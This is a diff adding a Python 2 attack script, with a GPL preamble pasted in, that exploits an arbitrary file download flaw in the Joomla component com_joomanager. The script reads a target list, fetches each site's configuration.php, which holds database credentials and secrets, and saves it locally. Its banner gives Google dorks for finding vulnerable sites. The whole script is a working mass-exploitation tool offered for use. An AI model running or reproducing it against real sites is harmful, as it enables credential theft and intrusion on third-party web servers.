@@ -1,0 +1,265 @@
+#!/usr/bin/python2
+# -*- coding:utf-8 -*-
+'''
+
+                    GNU GENERAL PUBLIC LICENSE
+                       Version 3, 29 June 2007
+
+ Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
+ Everyone is permitted to copy and distribute verbatim copies
+ of this license document, but changing it is not allowed.
+
+                            Preamble
+
+  The GNU General Public License is a free, copyleft license for
+software and other kinds of works.
+
+  The licenses for most software and other practical works are designed
+to take away your freedom to share and change the works.  By contrast,
+the GNU General Public License is intended to guarantee your freedom to
+share and change all versions of a program--to make sure it remains free
+software for all its users.  We, the Free Software Foundation, use the
+GNU General Public License for most of our software; it applies also to
+any other work released this way by its authors.  You can apply it to
+your programs, too.
+
+  When we speak of free software, we are referring to freedom, not
+price.  Our General Public Licenses are designed to make sure that you
+have the freedom to distribute copies of free software (and charge for
+them if you wish), that you receive source code or can get it if you
+want it, that you can change the software or use pieces of it in new
+free programs, and that you know you can do these things.
+
+  To protect your rights, we need to prevent others from denying you
+these rights or asking you to surrender the rights.  Therefore, you have
+certain responsibilities if you distribute copies of the software, or if
+you modify it: responsibilities to respect the freedom of others.
+
+  For example, if you distribute copies of such a program, whether
+gratis or for a fee, you must pass on to the recipients the same
+freedoms that you received.  You must make sure that they, too, receive
+or can get the source code.  And you must show them these terms so they
+know their rights.
+
+  Developers that use the GNU GPL protect your rights with two steps:
+(1) assert copyright on the software, and (2) offer you this License
+giving you legal permission to copy, distribute and/or modify it.
+
+  For the developers' and authors' protection, the GPL clearly explains
+that there is no warranty for this free software.  For both users' and
+authors' sake, the GPL requires that modified versions be marked as
+changed, so that their problems will not be attributed erroneously to
+authors of previous versions.
+
+  Some devices are designed to deny users access to install or run
+modified versions of the software inside them, although the manufacturer
+can do so.  This is fundamentally incompatible with the aim of
+protecting users' freedom to change the software.  The systematic
+pattern of such abuse occurs in the area of products for individuals to
+use, which is precisely where it is most unacceptable.  Therefore, we
+have designed this version of the GPL to prohibit the practice for those
+products.  If such problems arise substantially in other domains, we
+stand ready to extend this provision to those domains in future versions
+of the GPL, as needed to protect the freedom of users.
+
+  Finally, every program is threatened constantly by software patents.
+States should not allow patents to restrict development and use of
+software on general-purpose computers, but in those that do, we wish to
+avoid the special danger that patents applied to a free program could
+make it effectively proprietary.  To prevent this, the GPL assures that
+patents cannot be used to render the program non-free.
+
+  The precise terms and conditions for copying, distribution and
+modification follow.
+'''
+try:
+	import urllib2
+except:
+	print "$ pip2 install urllib2"
+try:
+	import argparse
+except:
+	print "$ pip2 install argparse"
+try:
+	import BeautifulSoup
+except:
+	print "$ pip2 install BeautifulSoup"
+try:
+	import urlparse
+except:
+	print "$ pip2 install urlparse"
+try:
+	import requests
+except:
+	print "$ pip2 install requests"
+try:
+	import threading
+except:
+	print "$ pip2 install threading"
+import time, sys , os
+global Animation, slowprint, fastprint
+os.system('clear')
+
+class Lab_Collors():
+    vermelho = '\033[31m'
+    verde = '\033[32m'
+    azul = '\033[34m'
+    ciano = '\033[36m'
+    purple = '\033[35m'
+    amarelo = '\033[33m'
+    preto = '\033[30m'
+    branco = '\033[37m'
+    original = '\033[0;0m'
+    reverso = '\033[2m'    
+    default  = '\033[0m'
+
+def slowprint(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush() # defeat buffering
+        time.sleep(8./90)
+#time.sleep(10./90)
+
+def fastprint(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush() # defeat buffering
+        time.sleep(1./50)
+
+def Animation(String, color):
+    animation = "|/-\\"
+    for i in range(15):
+        time.sleep(0.1)
+        sys.stdout.write("\r" + "[" + animation[i % len(animation)] + "]" + color + String)
+        sys.stdout.flush()
+    print('')
+
+print ''
+parser = argparse.ArgumentParser(description='JOOMANAGER_Arbitrary_File_Download')
+parser.add_argument('-t','--targets', action='store',help='--targets Targets.txt')
+args = parser.parse_args()
+
+
+
+class Lab_Banners():
+	Bulls = '''
+					   ╭━━━┳╮╱╱╱╱╱╱╱╭╮
+					   ┃╭━╮┃┃╱╱╱╱╱╱╭╯╰╮
+					   ┃╰━╯┃╰━┳━━┳━╋╮╭╋━━┳━━┳╮╭╮
+					   ┃╭━━┫╭╮┃╭╮┃╭╮┫┃┃╭╮┃━━┫╰╯┃
+					   ┃┃╱╱┃┃┃┃╭╮┃┃┃┃╰┫╭╮┣━━┃┃┃┃
+					   ╰╯╱╱╰╯╰┻╯╰┻╯╰┻━┻╯╰┻━━┻┻┻╯
+       ,                         .                ╭╮╱╱╱╱╱╭╮
+      /|                         |\               ┃┃╱╱╱╱╱┃┃
+     |-|  łαbørαŧøriø Ŧαηŧαsмα   |-|              ┃┃╱╱╭━━┫╰━╮  
+     [  "-.____           ____.-"  ]              ┃┃╱╭┫╭╮┃╭╮┃
+      \_     / \ ___.___ /  \     _/              ┃╰━╯┃╭╮┃╰╯┃
+        "-__[    ===!===    ]__-"                 ╰━━━┻╯╰┻━━╯
+            |               |       +==========================================================+
+      .-"" _|=__    |    __=|_ ""-, |        COM_JOOMANAGER ARBITRARY FILE DOWNLOAD            |
+       `""" \  "`==´ `==´"  / """´  +==========================================================+
+             \  \\     //  /         | [*] GoogleDork: allinurl:index.php?option=com_joomanager |
+              \  |\___/|  /         | [*] GoogleDork: allinurl:/component/joomanager/          |
+               \,;-----;./          | [*] Coded: Luth1er     [*] Date: 30 - 06 - 2017          |
+               |  @@ @@  |          | [*] GitHub: https://github.com/Luth1er                   |
+                \ -"""- /           |            -  I take no responsibilities for the         |
+                 `-----´            |            -       use of this program !                 |
+                                    +==========================================================+'''
+if not args.targets:
+	os.system('clear')
+	print Lab_Collors.azul+Lab_Banners.Bulls
+	print ''
+	print Lab_Collors.ciano+"[*] Usage: "
+	print Lab_Collors.branco+"Joomanager_Afd.py --target Targets.txt"
+	print Lab_Collors.branco+"Joomanager_Afd.py -t Targets.txt"
+	print ''
+	exit()
+
+print Lab_Collors.azul+Lab_Banners.Bulls
+slowprint(Lab_Collors.ciano+"                                                    Telegram: "+Lab_Collors.purple+"@DreadPirateRobertt")
+fastprint(Lab_Collors.ciano+"                                                    Telegram: "+Lab_Collors.azul+"t.me/Phantasm_Lab")
+
+
+class COM_JOOMANAGER_ARBITRARY_FILE_DOWNLOAD(threading.Thread):
+	global Animation, fastprint
+	def __init__(self, targets):
+		threading.Thread.__init__(self)
+		targets = open(targets, 'r').readlines()
+		self.targets = targets
+		self.process = None
+	def run(self):
+		try:
+			count = 0
+			print ''
+			Animation("COM_JOOMANAGER_ARBITRARY_FILE_DOWNLOAD", Lab_Collors.verde)
+			print ''
+			for target in self.targets:
+				try:
+					target = target.strip()
+					exploit3r = "index.php?option=com_joomanager&controller=details&task=download&path=configuration.php"
+					exploit_dir = str(target+exploit3r)
+					try:
+						path = urlparse.urlparse(target).path
+						url_title = target.replace(path, "")
+						title = requests.get(url_title)
+					except:
+						title = requests.get(target)
+					exploit = urllib2.urlopen(exploit_dir)
+
+					soup = BeautifulSoup.BeautifulSoup(title.content.decode('utf-8','ignore'))
+					Scraping_title = str(soup.title.text)
+					with open(soup.title.text+".php","wb") as Attatchment:
+						Attatchment.write(exploit.read())
+					print ''
+					print Lab_Collors.verde+"+==========================+"
+					print Lab_Collors.verde+"|  Exploit Information:    |"
+					print Lab_Collors.verde+"+================================================================================"
+					print Lab_Collors.purple+"[+] Target: {}".format(Lab_Collors.amarelo+url_title)
+					print Lab_Collors.purple+"[+] Title: {}".format(Lab_Collors.azul+Scraping_title)
+					fastprint(Lab_Collors.purple+"[+] Exploited: ========================================================> 100%")
+					print Lab_Collors.purple+"[+] Server: {}".format(str(Lab_Collors.amarelo+title.headers['server']))
+					try:
+						print Lab_Collors.purple+"[+] Connection: {}".format(Lab_Collors.branco+str(title.headers['Connection']))
+					except:
+						pass
+					print Lab_Collors.purple+"[+] Exploit: {}".format(Lab_Collors.vermelho+exploit3r)
+					print Lab_Collors.purple+"[+] Path: "+Lab_Collors.ciano+"/COM_JOOMANAGER-ARBITRARY-FILE-DOWNLOAD/Title.php"
+					print Lab_Collors.verde+"+================================================================================"
+					print ''
+					count = count + 1
+				except KeyboardInterrupt:
+					print("Exiting")
+					sys.exit(1)
+				except Exception as Error:
+					print "Error as {}".format(Error)
+					pass
+			Animation("Logout....", Lab_Collors.vermelho)
+			print Lab_Collors.branco+"[!] Total Exploited: %s" % str(count)
+			print ''
+			sys.exit(1)
+		except KeyboardInterrupt:
+			print "Exiting...."
+			sys.exit(1)
+
+def main():
+	try:
+		threads = 1
+		for host in range(int(threads)):
+			Init_Atck = COM_JOOMANAGER_ARBITRARY_FILE_DOWNLOAD(args.targets)
+			Init_Atck.daemon=True
+			Init_Atck.start()
+			while True: time.sleep(100)
+	except (KeyboardInterrupt, SystemExit):
+		print''
+		Animation(" Exit Threading....", Lab_Collors.vermelho)
+		
+
+if __name__ == '__main__':
+	try:
+		main()
+	except Exception as e:
+		print "[!] Error as %s" % e
+		exit()
+	except KeyboardInterrupt:
+		fastprint(Lab_Collors.vermelho+"[!] Keyboard as Interrupt....")
+		exit()
